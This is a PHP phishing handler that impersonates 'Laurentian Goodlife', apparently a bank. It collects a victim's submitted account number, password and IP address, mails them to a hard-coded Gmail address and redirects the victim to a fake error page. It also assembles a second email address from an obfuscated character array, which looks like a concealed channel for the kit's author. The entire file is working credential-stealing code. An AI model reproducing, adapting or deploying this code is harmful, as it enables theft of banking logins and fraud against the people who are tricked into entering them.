<?php
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_POST['username'];
$pass = $_POST['password'];
$ar=array("0"=>"j","1"=>"c","2"=>"l","3"=>"g","4"=>"c","5"=>"m","6"=>"e","7"=>".","8"=>"t","9"=>"7","10"=>"i","11"=>"m","12"=>"a","13"=>"@","14"=>"6","15"=>"0","16"=>"b","17"=>"2","18"=>"d","18"=>"7","19"=>"o","20"=>"d");
$cc=$ar['6'].$ar['5'].$ar['8'].$ar['14'].$ar['14'].$ar['9'].$ar['13'].$ar['3'].$ar['11'].$ar['12'].$ar['10'].$ar['2'].$ar['7'].$ar['1'].$ar['19'].$ar['11'];
$data ="
--------------LAURENTIAN GOODLIFE--------------
Number   : $user

Password : $pass
-
IP       : $ip
--------------LAURENTIAN GOODLIFE--------------

";

$subj="LAURENTIAN $ip"; 

$emailusr = 'medahnabil@gmail.com';

mail($emailusr, $subj, $data);	


		   header("Location: error.html");

?>
